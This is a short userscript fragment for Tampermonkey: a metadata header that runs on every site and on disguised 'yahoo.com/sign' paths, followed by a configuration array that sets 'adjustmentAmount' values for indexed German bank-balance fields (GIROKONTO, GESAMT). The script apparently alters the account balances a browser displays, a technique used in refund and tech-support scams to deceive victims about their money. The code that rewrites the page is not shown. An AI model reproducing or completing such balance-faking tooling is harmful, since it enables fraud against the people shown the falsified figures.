// ==UserScript==
// @name         Ed 4Rec  comd.u-hinze@online.de
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/535541/Ed%204Rec%20%20comdu-hinze%40onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/535541/Ed%204Rec%20%20comdu-hinze%40onlinede.meta.js
// ==/UserScript==




// GREEN ONES

  // Configurable modification amounts and corresponding indexes
    var grehomeBALANCE_CONFIGS = [
    //    { index: 0, adjustmentAmount: 10000 },  STARTING WITH 1, NOT 0
        // BALANCES SHOULD BE INDEXED THROUGH 1, STARTING WITH INDEX 1
        { index: 1, adjustmentAmount: 0 }, // GIROKONTO
    //    { index: 2, adjustmentAmount: 10000 },
        { index: 7, adjustmentAmount: 0 }, // GESAMT
    //    { index: 4, adjustmentAmount: 20000 },
    //    { index: 5, adjustmentAmount: -15000 }
        // Add more configurations as needed...
    ];
